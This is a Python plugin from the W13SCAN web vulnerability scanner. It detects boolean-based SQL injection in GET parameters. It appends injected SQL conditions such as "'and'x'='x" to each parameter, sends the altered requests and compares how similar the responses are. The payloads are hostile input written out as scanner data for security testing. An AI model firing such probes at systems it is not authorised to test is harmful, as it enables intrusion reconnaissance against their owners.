#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/6/30 4:19 PM
# @Author  : w8ay
# @File    : sql_inject_bool.py
import copy
import os

import requests

from lib.common import prepare_url, random_str
from lib.const import acceptedExt, ignoreParams
from lib.helper.diifpage import GetRatio
from lib.output import out
from lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = '基于布尔判断的SQL注入'
    desc = '''目前仅支持GET方式的请求'''

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if method == 'GET':
            # 从源码中获取更多链接
            if p.query == '':
                return
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            sql_flag = [
                "/**/and'{0}'='{1}'",
                "'and'{0}'='{1}",
                '"and"{0}"="{1}',
            ]
            for k, v in params.items():
                if k.lower() in ignoreParams:
                    continue
                data = copy.deepcopy(params)
                for flag in sql_flag:
                    # true page
                    rand_str = random_str(2)
                    payload1 = v + flag.format(rand_str, rand_str)
                    data[k] = payload1
                    url1 = prepare_url(netloc, params=data)
                    r = requests.get(url1, headers=headers)
                    html1 = r.text
                    radio = GetRatio(resp_str, html1)
                    if radio < 0.88:
                        continue

                    # false page
                    payload2 = v + flag.format(random_str(2), random_str(2))
                    data[k] = payload2
                    r2 = requests.get(netloc, params=data, headers=headers)
                    html2 = r2.text
                    radio = GetRatio(resp_str, html2)
                    if radio < 0.78:
                        msg = "{k}:{v} === {k}:{v1} and {k}:{v} !== {k}:{v2}".format(k=k, v=v, v1=payload1,
                                                                                      v2=payload2)
                        # out.log(msg)
                        out.success(url, self.name, payload=k, condition=msg)
                        break
